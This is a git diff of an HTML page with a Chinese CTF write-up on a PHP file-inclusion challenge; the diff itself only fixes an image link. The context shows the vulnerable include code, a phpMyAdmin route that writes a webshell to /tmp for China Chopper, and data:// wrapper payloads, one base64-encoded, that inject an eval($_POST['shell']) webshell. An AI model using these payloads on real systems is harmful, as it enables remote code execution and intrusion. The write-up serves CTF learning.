@@ -70,7 +70,7 @@
 
 <p><code>$page=$_GET[&#39;page&#39;];</code><br>#get一个参数<br><code>str_replace(&quot;php://&quot;, &quot;&quot;, $page);</code><br>#文本替换,区分大小写(将php://替换为空)<br><code>include($page)</code><br>#包含文件</p>
 <p>这个个题有两个思路,一个是扫描网站目录.使用phpmyadmin登录进行数据库操作,或者使用php伪协议进行操作</p>
-<p>1, phpmyadmin操作:<br><img src="https://raw.githubusercontent.com/sakuradied/data/master/img/2020-08-25_15-50.png" alt="img"><br>直接使用菜刀连接即可<br><img src="!%5Bimage.png%5D(https://i.loli.net/2020/08/25/YE3jev5QISabWlt.png)" alt="img"></p>
+<p>1, phpmyadmin操作:<br><img src="https://raw.githubusercontent.com/sakuradied/data/master/img/2020-08-25_15-50.png" alt="img"><br>直接使用菜刀连接即可<br><img src="https://i.loli.net/2020/08/25/YE3jev5QISabWlt.png" alt="image.png"></p>
 <p>这里写入到tmp目录,是因为tmp目录默认有任意读写权限的<br><img src="https://i.loli.net/2020/08/25/45FcApC6kgY1qPj.png" alt="image.png"></p>
 <p>2, 伪协议的利用:<br>    ?page=data:text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWydzaGVsbCddKTsgPz4=</p>
 <p>​    ?page=data://text/plain,<?php%20@eval($_POST[%27shell%27]);%20?></p>
